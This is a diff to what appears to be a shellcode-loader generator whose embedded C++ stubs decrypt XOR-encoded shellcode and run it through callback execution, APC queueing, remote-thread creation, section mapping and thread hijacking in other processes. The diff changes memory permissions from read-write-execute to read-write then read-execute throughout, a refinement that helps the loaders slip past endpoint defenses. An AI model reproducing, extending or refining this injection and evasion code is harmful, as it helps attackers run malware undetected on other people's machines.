@@ -181,7 +181,7 @@ void run() {
 
         // Change permissions to RX
         ULONG old_protect;
-        NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READWRITE, &old_protect);
+        NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);
 
         // Execute
         EnumSystemLocalesA((LOCALE_ENUMPROCA)lbuffer, 0);
@@ -318,14 +318,14 @@ void run() {
         XOR((char*)shellcode, shellcode_len, key, sizeof(key));
 
         // Allocate memory with permissions RW
-        NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        NtAllocateVirtualMemory(curproc, &lbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 
         // Write code into memory
         NtWriteVirtualMemory(curproc, lbuffer, shellcode, shellcode_len, nullptr);
 
         // Change permissions to RX
         ULONG old_protect;
-        //NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);
+        NtProtectVirtualMemory(curproc, &lbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);
 
         // Create APC
         NtQueueApcThread(GetCurrentThread(), (PKNORMAL_ROUTINE)lbuffer, NULL, NULL, NULL);
@@ -506,7 +506,7 @@ void run(HANDLE targetproc) {
 
         // Change permissions to RX
         ULONG old_protect;
-        NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READWRITE, &old_protect);
+        NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);
 
         NtCreateThreadEx(&remoteProc, GENERIC_EXECUTE, NULL, targetproc, rbuffer, NULL, FALSE, 0, 0, 0, nullptr);
 
@@ -542,7 +542,7 @@ stub4 = """
 #include <tlhelp32.h>
 #pragma comment(lib, "netapi32.lib")
 
-// mingw is whack and cant find these in header files, so have to resolve at runtime
+// g++ is whack and cant find these in header files, so have to resolve at runtime
 
 const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
 
@@ -780,7 +780,7 @@ void run() {
         XOR((char*)shellcode, shellcode_len, key, sizeof(key));
         NtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
         NtMapViewOfSection(sectionHandle, curproc, &localSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_READWRITE);
-        NtMapViewOfSection(sectionHandle, processInfo.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_EXECUTE_READWRITE); // change to RX
+        NtMapViewOfSection(sectionHandle, processInfo.hProcess, &remoteSectionAddress, NULL, NULL, NULL, &size, (SECTION_INHERIT)2, NULL, PAGE_EXECUTE_READ); // change to RX
 
 
         SIZE_T byteswritten = 0;
@@ -965,7 +965,7 @@ void run(HANDLE targetproc, int procID) {
         XOR((char*)shellcode, shellcode_len, key, sizeof(key));
         NtAllocateVirtualMemory(targetproc, &rbuffer, 0, &shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
         NtWriteVirtualMemory(targetproc, rbuffer, shellcode, shellcode_len, nullptr);
-        NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READWRITE, &old_protect);
+        NtProtectVirtualMemory(targetproc, &rbuffer, &shellcode_len, PAGE_EXECUTE_READ, &old_protect);
 
         HANDLE snapshot = CreateToolhelp32Snapshot((TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD), 0);
 
@@ -1179,9 +1179,9 @@ void run(HANDLE remoteProc, int processID) {
         cid2.UniqueProcess = 0;
 
         XOR((char*)shellcode, shellcode_len, key, sizeof(key));
-        NtAllocateVirtualMemory(remoteProc, &remoteBuffer, 0, &shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        NtAllocateVirtualMemory(remoteProc, &remoteBuffer, 0, &shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         NtWriteVirtualMemory(remoteProc, remoteBuffer, shellcode, sizeof(shellcode), &byteswritten);
-        NtProtectVirtualMemory(remoteProc, &remoteBuffer, &shellcode_len, PAGE_EXECUTE_READWRITE, &oldprotect);
+        NtProtectVirtualMemory(remoteProc, &remoteBuffer, &shellcode_len, PAGE_EXECUTE_READ, &oldprotect);
 
         snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         Thread32First(snapshot, &threadentry);
